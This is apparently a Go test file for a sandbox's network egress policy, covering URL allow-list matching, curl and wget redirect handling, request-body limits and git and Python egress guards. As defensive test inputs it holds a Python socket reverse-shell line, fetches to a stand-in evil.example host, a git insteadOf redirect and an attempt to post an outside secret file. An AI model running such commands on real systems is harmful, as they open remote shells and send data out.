package sandbox

import (
	"fmt"
	"io"
	"net/http"
	"net/http/httptest"
	"net/url"
	"os"
	"strconv"
	"strings"
	"testing"
)

func TestPolicyAllows(t *testing.T) {
	p := DefaultPolicy()
	p.AllowedPrefixes = append(p.AllowedPrefixes, "https://releases.astral.sh/", "https://pkg.example/dist")
	cases := map[string]bool{
		"https://releases.astral.sh/installers/uv/latest/uv-installer.sh": true,
		"https://objects.githubusercontent.com/abc":                       true,
		"https://github.com/astral-sh/uv/releases/download/x":             true,
		"https://pkg.example/dist":                                        true, // the prefix path itself
		"https://pkg.example/dist/v1/x.tgz":                               true,
		"https://example.com/":                                            false,
		"https://pkg.example/distant/x":                                   false, // a path prefix matches whole segments
		"http://releases.astral.sh/x":                                     false, // scheme mismatch
		"https://releases.astral.sh:8443/x":                               false, // a non-default port is a different host
	}
	for raw, want := range cases {
		u, err := url.Parse(raw)
		if err != nil {
			t.Fatal(err)
		}
		if got := p.Allows(u); got != want {
			t.Errorf("Allows(%s) = %v, want %v", raw, got, want)
		}
	}
	if p.AllowsTarget("evil.example:443") {
		t.Error("a bare host:port must never be allowed")
	}
}

// TestPolicyRejectsAmbiguousURLs: a URL that READS as an allow-listed host and
// RESOLVES somewhere else is the failure mode of every allow-list that compares
// URLs as text. None of these may pass, on the first request or on a redirect.
func TestPolicyRejectsAmbiguousURLs(t *testing.T) {
	p := DefaultPolicy()
	p.AllowedPrefixes = append(p.AllowedPrefixes, "https://releases.astral.sh/")
	for _, raw := range []string{
		"https://releases.astral.sh.evil.example/payload.sh", // suffix, not the host
		"https://releases.astral.sh@evil.example/payload.sh", // userinfo: the client dials evil.example
		"https://github.com@evil.example/x",
		"https://github.com/astral-sh/../../evil-org/repo",  // the server normalises this
		"https://github.com/astral-sh/%2e%2e/evil-org/repo", // ditto, percent-encoded
		"https://objects.githubusercontent.com.evil.example/x",
	} {
		u, err := url.Parse(raw)
		if err != nil {
			t.Fatalf("parse %s: %v", raw, err)
		}
		if p.Allows(u) {
			t.Errorf("Allows(%s) = true, want false (resolves to %q)", raw, u.Hostname())
		}
	}
}

// TestPolicyValidate: an entry with no scheme cannot match anything, so the
// policy fails closed — safe, but silent. Validate is how a caller taking the
// list from a user says so instead.
func TestPolicyValidate(t *testing.T) {
	p := DefaultPolicy()
	if err := p.Validate(); err != nil {
		t.Errorf("the default policy should validate: %v", err)
	}
	p.AllowedPrefixes = append(p.AllowedPrefixes, "example.com/dist", "https://ok.example/")
	err := p.Validate()
	if err == nil || !strings.Contains(err.Error(), "example.com/dist") {
		t.Errorf("Validate should name the bad entry; got %v", err)
	}
	if strings.Contains(fmt.Sprint(err), "ok.example") {
		t.Errorf("Validate should not name the good entry; got %v", err)
	}
}

func TestPolicyAllowedHosts(t *testing.T) {
	p := Policy{AllowedHosts: []string{"downloads.example.test", "2001:db8::1"}}
	for target, want := range map[string]bool{
		"https://downloads.example.test/tool":      true,
		"https://DOWNLOADS.EXAMPLE.TEST:8443/tool": true,
		"https://sub.downloads.example.test/tool":  false,
		"downloads.example.test:443":               true,
		"other.example.test:443":                   false,
		"[2001:db8::1]:443":                        true,
	} {
		if got := p.AllowsTarget(target); got != want {
			t.Errorf("AllowsTarget(%q) = %v, want %v", target, got, want)
		}
	}
	if err := p.Validate(); err != nil {
		t.Fatal(err)
	}
	p.AllowedHosts = []string{"downloads.example.test:443"}
	if err := p.Validate(); err == nil {
		t.Error("a manifest host with a port was accepted")
	}
}

// TestURLAllowListStopsDownload: even when the downloader is permitted, a fetch
// to an off-list URL is refused in-process (curl/wget never shell out).
func TestURLAllowListStopsDownload(t *testing.T) {
	_, er, err := runConfined(t, `curl -sSfL https://rvm.example/rvm/archive/master.tar.gz -o rvm.tgz`)
	if err == nil || !strings.Contains(er, "URL not in allow-list") {
		t.Errorf("expected a URL-allow-list denial; stderr=%q err=%v", er, err)
	}
}

// TestCurlFollowsOnlyWithL: the in-process curl honours -L. Without it the 3xx
// response itself is returned, as real curl does; with it the redirect is
// followed (and re-checked against the allow-list on every hop).
func TestCurlFollowsOnlyWithL(t *testing.T) {
	srv := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		switch r.URL.Path {
		case "/redir":
			http.Redirect(w, r, "/final", http.StatusFound)
		case "/final":
			w.Write([]byte("FINAL"))
		case "/off":
			http.Redirect(w, r, "https://evil.example/x", http.StatusFound)
		}
	}))
	defer srv.Close()
	local := func(c *Config) { c.Network.AllowedPrefixes = []string{srv.URL} }

	if out, _, err := runConfined(t, "curl -s "+srv.URL+"/redir", local); err != nil || strings.Contains(out, "FINAL") {
		t.Errorf("curl without -L must not follow; out=%q err=%v", out, err)
	}
	if out, _, err := runConfined(t, "curl -sL "+srv.URL+"/redir", local); err != nil || !strings.Contains(out, "FINAL") {
		t.Errorf("curl -L should follow; out=%q err=%v", out, err)
	}
	if out, _, err := runConfined(t, "wget -q -O - "+srv.URL+"/redir", local); err != nil || !strings.Contains(out, "FINAL") {
		t.Errorf("wget follows by default; out=%q err=%v", out, err)
	}
	if _, er, err := runConfined(t, "curl -sL "+srv.URL+"/off", local); err == nil || !strings.Contains(er, "disallowed URL") {
		t.Errorf("a redirect to an off-list host must be refused; stderr=%q err=%v", er, err)
	}
	// -w '%{redirect_url}' on an unfollowed 3xx prints the absolute target
	// (warp's version probe); on a final response it prints nothing.
	if out, _, err := runConfined(t, "curl -fsS -o /dev/null -w '%{redirect_url}' "+srv.URL+"/redir", local); err != nil || out != srv.URL+"/final" {
		t.Errorf("redirect_url = %q, want %q; err=%v", out, srv.URL+"/final", err)
	}
	if out, _, err := runConfined(t, "curl -fsS -o /dev/null -w '[%{redirect_url}][%{http_code}]' "+srv.URL+"/final", local); err != nil || out != "[][200]" {
		t.Errorf("redirect_url on a 200 = %q, want \"[][200]\"; err=%v", out, err)
	}
}

func TestCurlRequestBody(t *testing.T) {
	srv := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		body, err := io.ReadAll(r.Body)
		if err != nil {
			t.Errorf("read body: %v", err)
		}
		fmt.Fprintf(w, "%s|%s|%s", r.Method, r.Header.Get("Content-Type"), body)
	}))
	defer srv.Close()
	allow := func(c *Config) {
		c.Network.AllowedPrefixes = []string{srv.URL}
		c.Network.AllowedMethods["POST"] = true
	}

	out, er, err := runConfined(t, "curl -s -d a=b -d 'c=d e' "+srv.URL, allow)
	if err != nil || out != "POST|application/x-www-form-urlencoded|a=b&c=d e" {
		t.Fatalf("literal body = %q, stderr=%q, err=%v", out, er, err)
	}
	out, er, err = runConfined(t, "curl -s --data-urlencode 'q=a b' "+srv.URL, allow)
	if err != nil || !strings.HasSuffix(out, "|q=a%20b") {
		t.Fatalf("urlencoded body = %q, stderr=%q, err=%v", out, er, err)
	}
	out, er, err = runConfined(t, "printf 'a\\nb\\n' > body; curl -s --data-binary @body "+srv.URL, withHome(t), allow)
	if err != nil || !strings.HasSuffix(out, "|a\nb\n") {
		t.Fatalf("file body = %q, stderr=%q, err=%v", out, er, err)
	}

	outside := t.TempDir() + "/secret"
	if err := os.WriteFile(outside, []byte("secret"), 0o600); err != nil {
		t.Fatal(err)
	}
	_, er, err = runConfined(t, "curl -s --data-binary @"+strconv.Quote(outside)+" "+srv.URL, allow)
	if err == nil || !strings.Contains(er, "refusing to read request body outside") {
		t.Fatalf("outside body file was not refused: stderr=%q err=%v", er, err)
	}
	_, er, err = runConfined(t, "curl -s -d abcd "+srv.URL, allow, func(c *Config) { c.Network.MaxRequest = 3 })
	if err == nil || !strings.Contains(er, "request body exceeded 3 bytes") {
		t.Fatalf("oversize body was not refused: stderr=%q err=%v", er, err)
	}
}

// TestGitHubPrefixes: the GitHub set covers a release download end to end —
// the release page, its API, the asset redirect target — and nothing broader.
func TestGitHubPrefixes(t *testing.T) {
	p := DefaultPolicy()
	p.AllowedPrefixes = append(p.AllowedPrefixes, GitHubPrefixes()...)
	for _, u := range []string{
		"https://github.com/trufflesecurity/trufflehog/releases/latest",
		"https://api.github.com/repos/aquasecurity/trivy/releases/latest",
		"https://raw.githubusercontent.com/nvm-sh/nvm/v0.40.3/install.sh",
		"https://objects.githubusercontent.com/github-production-release-asset-2e65be/x",
		"https://release-assets.githubusercontent.com/github-production-release-asset/x",
		"https://codeload.github.com/o/r/tar.gz/refs/tags/v1",
	} {
		if !p.AllowsTarget(u) {
			t.Errorf("%s should be allowed", u)
		}
	}
	for _, u := range []string{"https://github.com.evil.example/x", "http://github.com/x", "https://gist.github.com/x", "https://github.com@evil.example/x"} {
		if p.AllowsTarget(u) {
			t.Errorf("%s should not be allowed", u)
		}
	}
}

// TestInterpreterEgress: allow-listing an interpreter grants the interpreter,
// not the network. An offline one-liner runs; the one-line server and the
// socket reverse shell are still held by the egress guard, and the denial
// names the endpoint the code dialled rather than just "python3".
func TestInterpreterEgress(t *testing.T) {
	allowPython := func(c *Config) { c.Allowed = c.Allowed.With("python3") }
	if out, er, err := runConfined(t, `python3 -c 'print("offline")'`, allowPython); err != nil || !strings.Contains(out, "offline") {
		t.Errorf("an offline python one-liner should run when allow-listed; out=%q stderr=%q err=%v", out, er, err)
	}
	for script, want := range map[string]string{
		`python3 -m http.server 8000`: "python3 → http.server 8000",
		`python3 -c 'import socket;s=socket.socket();s.connect(("10.0.0.1",1234))'`:           "python3 → 10.0.0.1:1234",
		`python3 -c 'import urllib.request;urllib.request.urlopen("https://evil.example/x")'`: "python3 → https://evil.example/x",
	} {
		_, er, err := runConfined(t, script, allowPython)
		if err == nil || !strings.Contains(er, "network egress denied: "+want) {
			t.Errorf("%q should be denied as %q; stderr=%q err=%v", script, want, er, err)
		}
	}
}

// TestGitEgress: when git is explicitly granted, the egress guard holds its
// remote operations to Policy.GitHosts by host — over https, ssh, git:// and
// the scp-like form alike — and still honours the URL prefix list.
func TestGitEgress(t *testing.T) {
	p := DefaultPolicy()
	for target, want := range map[string]bool{
		"https://github.com/o/r.git":          true,
		"https://gitlab.com/o/r":              true,
		"git@bitbucket.org:o/r.git":           true,
		"ssh://git@github.com:22/o/r":         true,
		"git://github.com/o/r":                true,
		"https://gist.github.com/x":           true,  // subdomain
		"https://github.com.evil.example/o/r": false, // not a subdomain
		"git@evil.example:o/r":                false,
		"https://evil.example/o/r":            false,
		"origin":                              false, // a remote name: the guard resolves it first
		"file:///srv/mirror/r":                true,  // a local remote reaches no network
		"https://releases.astral.sh/x":        false, // AllowedPrefixes does not grant git
	} {
		if got := p.AllowsGit(target); got != want {
			t.Errorf("AllowsGit(%q) = %v, want %v", target, got, want)
		}
	}
	p.GitHosts = []string{"git.corp.example"}
	if p.AllowsGit("https://github.com/o/r") || !p.AllowsGit("git@git.corp.example:o/r") {
		t.Error("GitHosts should replace the default forges")
	}
	// End to end: explicitly granted git runs, an off-list clone is denied before it
	// spawns, and a bare `git fetch` outside any repository resolves to no
	// host so it is denied too.
	out, stderr, _ := runConfined(t, `
git --version
git clone https://evil.example/o/r
git fetch
`, func(c *Config) { c.Allowed = c.Allowed.With("git") })
	if !strings.Contains(out, "git version") {
		t.Errorf("explicitly granted git should run; out=%q stderr=%q", out, stderr)
	}
	for _, want := range []string{"egress denied: git → https://evil.example/o/r", "egress denied: git → origin"} {
		if !strings.Contains(stderr, want) {
			t.Errorf("stderr missing %q:\n%s", want, stderr)
		}
	}
	for _, script := range []string{
		`git submodule update --init`,
		`git -c 'url.https://evil.example/.insteadOf=https://github.com/' clone https://github.com/o/r`,
	} {
		_, stderr, err := runConfined(t, script, func(c *Config) { c.Allowed = c.Allowed.With("git") })
		if err == nil || !strings.Contains(stderr, "network egress denied: git") {
			t.Errorf("unsafe git form was not denied: %q stderr=%q err=%v", script, stderr, err)
		}
	}
}

// TestMultipleURLsRefused: a Request carries one URL, but curl takes several
// and pairs them with successive -o names. Serving only the first would fetch
// part of what was asked for and say nothing about the rest, so the whole
// invocation is refused and the dropped URLs are named.
func TestMultipleURLsRefused(t *testing.T) {
	srv := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		w.Write([]byte("body"))
	}))
	defer srv.Close()
	allowLocal := func(c *Config) { c.Network.AllowedPrefixes = []string{srv.URL} }

	_, er, err := runConfined(t, "curl -fsS "+srv.URL+"/a "+srv.URL+"/b -o out", allowLocal)
	if err == nil {
		t.Fatalf("two URLs in one fetch should be refused; stderr=%q", er)
	}
	for _, want := range []string{"one URL per invocation", "/a", "/b"} {
		if !strings.Contains(er, want) {
			t.Errorf("stderr should name what was dropped (%q); got %q", want, er)
		}
	}
	// One URL plus a non-URL operand is still an ordinary fetch.
	if out, er, err := runConfined(t, "curl -fsS "+srv.URL+"/a", allowLocal); err != nil || out != "body" {
		t.Errorf("a single URL should work; out=%q stderr=%q err=%v", out, er, err)
	}
}
